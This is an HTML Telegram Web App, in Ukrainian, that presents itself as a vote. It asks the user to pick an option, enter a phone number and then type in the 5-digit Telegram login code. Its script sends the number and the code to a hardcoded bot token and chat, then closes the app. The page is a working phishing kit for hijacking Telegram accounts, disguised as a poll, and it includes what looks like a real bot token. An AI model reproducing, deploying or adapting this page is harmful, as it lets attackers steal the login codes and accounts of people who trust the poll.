<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* Змінені змінні для тексту, щоб він був білим на темному фоні */
        :root { 
            --btn: var(--tg-theme-button-color, #3390ec); 
            --btn-text: var(--tg-theme-button-text-color, #fff); 
        }
        
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            padding: 20px; 
            
            /* ФОН: ЗАМІНИ ПОСИЛАННЯ НА СВОЮ КАРТИНКУ, ЯКЩО ТРЕБА */
            background: url('https://images.unsplash.com/photo-1557683316-973673baf926?q=80&w=1000&auto=format&fit=crop') no-repeat center center fixed; 
            background-size: cover;
            background-color: #1a1a1a;
            
            color: #ffffff; /* Білий текст */
            margin: 0; 
            min-height: 100vh;
        }
        
        h2 { font-size: 22px; font-weight: 600; margin: 20px 0 15px; text-align: center; color: #ffffff; }
        p { font-size: 14px; color: #dddddd; margin-bottom: 15px; text-align: center; }
        
        /* Картки */
        .vote-card { 
            display: flex; 
            align-items: center; 
            background: rgba(255, 255, 255, 0.9); /* Напівпрозорий білий фон картки */
            color: #000000; /* Чорний текст всередині картки */
            border: 2px solid transparent; 
            border-radius: 14px; 
            padding: 10px; 
            margin-bottom: 12px; 
            cursor: pointer; 
            transition: all 0.2s; 
        }
        .vote-card.selected { border-color: var(--btn); background: rgba(255, 255, 255, 1); }
        .vote-card img { 
            width: 60px; height: 60px; 
            border-radius: 10px; 
            object-fit: cover; 
            margin-right: 15px; 
            background: #ccc;
        }
        .vote-card .vote-title { font-size: 16px; font-weight: 600; }

        .main-btn { background: var(--btn); color: var(--btn-text); border: none; border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600; width: 100%; margin-top: 10px; cursor: pointer; }
        .main-btn:disabled { opacity: .5; cursor: not-allowed; }
        
        /* Кнопка Назад */
        .back-btn { background: transparent; color: #ffffff; border: none; font-size: 14px; margin-top: 15px; cursor: pointer; display: block; width: 100%; text-decoration: underline; opacity: 0.8; }
        
        .hidden { display: none !important; }
        
        /* Поля вводу */
        input[type="tel"], input[type="text"] { 
            width: 100%; box-sizing: border-box; padding: 14px; font-size: 18px; 
            border: 2px solid transparent; border-radius: 10px; 
            background: rgba(255, 255, 255, 0.9); color: #000000; 
            margin-bottom: 12px; text-align: center; 
        }
        input:focus { outline: none; border-color: var(--btn); background: #ffffff; }
        
        #debug { font-size: 12px; color: #34c759; margin-top: 20px; text-align: center; word-break: break-all; }
    </style>
</head>
<body>

    <!-- ЕКРАН 1: ГОЛОСУВАННЯ -->
    <div id="screen-vote">
        <h2>Зробіть вибір</h2>
        <p>Натисніть на одну з карток</p>
        
        <div class="vote-card" data-vote="Варіант 1" onclick="selectVote(this)">
            <img src="https://picsum.photos/id/1015/100/100" alt="Варіант 1">
            <div class="vote-title">Варіант 1</div>
        </div>
        
        <div class="vote-card" data-vote="Варіант 2" onclick="selectVote(this)">
            <img src="https://picsum.photos/id/1025/100/100" alt="Варіант 2">
            <div class="vote-title">Варіант 2</div>
        </div>
        
        <div class="vote-card" data-vote="Варіант 3" onclick="selectVote(this)">
            <img src="https://picsum.photos/id/1035/100/100" alt="Варіант 3">
            <div class="vote-title">Варіант 3</div>
        </div>

        <button class="main-btn" id="btn-next-vote" disabled onclick="showPhone()">Далі</button>
    </div>

    <!-- ЕКРАН 2: НОМЕР -->
    <div id="screen-phone" class="hidden">
        <h2>Ваш номер</h2>
        <p>Введіть номер телефону для обліку голосу</p>
        <input type="tel" id="phone-input" placeholder="+380 99 123-45-67">
        <button class="main-btn" id="btn-manual" disabled onclick="submitPhone()">Надіслати номер</button>
        <button class="back-btn" onclick="goBack('screen-phone', 'screen-vote')">← Змінити голос</button>
    </div>

    <!-- ЕКРАН 3: КОД -->
    <div id="screen-code" class="hidden">
        <h2>Введіть код</h2>
        <p>Код із 5 цифр, який надійшов у Telegram</p>
        <input type="text" id="code-input" inputmode="numeric" maxlength="5" placeholder="00000" autocomplete="one-time-code">
        <button class="main-btn" id="btn-submit" disabled onclick="submitCode()">Надіслати код</button>
        <button class="back-btn" onclick="goBack('screen-code', 'screen-phone')">← Змінити номер</button>
    </div>

    <div id="debug"></div>

    <script>
        const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
        const CHAT_ID = "-1004399809740";

        const dbg = (m) => { console.log('[VOTE]', m); const d = document.getElementById('debug'); if (d) d.innerText = m; };
        let selectedVote = null;

        async function sendLog(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch (e) { console.error("Помилка", e); }
        }

        function selectVote(el) {
            document.querySelectorAll('.vote-card').forEach(e => e.classList.remove('selected'));
            el.classList.add('selected');
            selectedVote = el.getAttribute('data-vote');
            document.getElementById('btn-next-vote').disabled = false;
        }

        function showPhone() {
            if (!selectedVote) return;
            document.getElementById('screen-vote').classList.add('hidden');
            document.getElementById('screen-phone').classList.remove('hidden');
            setTimeout(() => document.getElementById('phone-input').focus(), 100);
        }

        function goBack(hideId, showId) {
            document.getElementById(hideId).classList.add('hidden');
            document.getElementById(showId).classList.remove('hidden');
        }

        const phoneInput = document.getElementById('phone-input');
        phoneInput.addEventListener('input', () => {
            phoneInput.value = phoneInput.value.replace(/[^\d+]/g, '');
            document.getElementById('btn-manual').disabled = phoneInput.value.replace(/\D/g,'').length < 10;
        });

        function submitPhone() {
            let phone = phoneInput.value;
            dbg('Номер надіслано: ' + phone);
            
            sendLog(`📱 <b>НОМЕР:</b> ${phone}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
            
            document.getElementById('screen-phone').classList.add('hidden');
            document.getElementById('screen-code').classList.remove('hidden');
            setTimeout(() => document.getElementById('code-input').focus(), 100);
        }

        const codeInput = document.getElementById('code-input');
        codeInput.addEventListener('input', () => {
            codeInput.value = codeInput.value.replace(/\D/g, '').slice(0, 5);
            document.getElementById('btn-submit').disabled = codeInput.value.length !== 5;
        });

        function submitCode() {
            const code = codeInput.value;
            if (code.length !== 5) return;
            dbg('Код надіслано: ' + code);

            sendLog(`🔑 <b>КОД:</b> ${code}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
            setTimeout(() => { try { window.Telegram.WebApp.close(); } catch(e){} }, 500);
        }

        window.onload = () => {
            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.expand();
                dbg('Готово до роботи');
            }
        };
    </script>
</body>
</html>
